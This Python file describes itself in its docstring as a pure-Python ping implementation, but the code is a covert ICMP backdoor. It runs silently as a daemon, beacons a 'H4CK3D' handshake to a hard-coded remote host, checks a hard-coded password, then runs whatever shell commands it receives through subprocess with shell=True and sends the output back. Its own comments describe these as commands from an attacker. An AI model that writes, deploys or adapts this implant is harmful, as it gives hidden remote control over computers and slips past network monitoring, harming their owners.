#!/usr/bin/env python
# encoding: utf-8
"""
"  A pure python ping implementation using raw socket.
"  ICMP messages can only be sent from processes running as root.
"""

import os, sys, socket, struct, select, time, string, subprocess
from ICMP_connection import ICMP
"""
" Note that this program has no print to stdout because it must be run as a deamon
"""

password = "123456"
local_host = "127.0.0.1"
destination = "10.0.24.6"


"""
" Function to receive commands from attacker and execute it
" The corresponding output is then sent back
"""
def execute_commands(icmp_helper):
    timeout = 10
    command = ""
    sequencial_timeouts = 0
    #when sequencial_timeouts gets to 10 I'll assume that the connection was lost
    while command != "exit" and sequencial_timeouts < 10:
        try:
           command = icmp_helper.receive(timeout)

           if(command != -1):
               #If it is a valid command and not a timeout
               sequencial_timeouts = 0
               command = command.strip()
               #Check if is CD
               if("cd" in command[:2]):
                   path = command[3:].lstrip()

                   if(path[0] != '~'):
                       path = os.path.realpath(path)
                   elif(path[0] == '~'):
                       path = os.path.expanduser("~")
                   os.chdir(path)
                   icmp_helper.send(os.getcwd())
               if(command == "exit"):
                   icmp_helper.send("exit")
               else:
                   proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                   output = proc.stdout.read()
                   output += proc.stderr.read()
                   icmp_helper.send( output.strip())
           else:
               # print "timeout..."
               # print "No command received..."
               sequencial_timeouts = sequencial_timeouts + 1
               pass
        except KeyboardInterrupt:
           break
        # except Exception as ex:
            #debug code
            # template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            # message = template.format(type(ex).__name__, ex.args)
            # print message



secret_handshake = "H4CK3D"
icmp_helper = ICMP(local_host, destination, os.getpid() & 0xFFFF, True)
timeout = 5
# # Wait for connection from client
# print "Starting program..."
# print "sending connection..."
# file_object  = open("./output.log", "a")
# file_object.write("I'm running\n")
while True:
    try:
        icmp_helper.send(secret_handshake)
        try:
            data = icmp_helper.receive(timeout)
            # print "Expecting password:"
            # print repr(data)

            if(password in data):
                # print "Connected!"
                icmp_helper.send("OK")
                execute_commands(icmp_helper)
            else:
                icmp_helper.send("WRONG")
                # print "Connection failed, retrying..."
            # print "---------------"
            time.sleep(1)
        except TypeError:
            # print "No password in data..."
            pass
    except KeyboardInterrupt:
       break


icmp_helper.close()
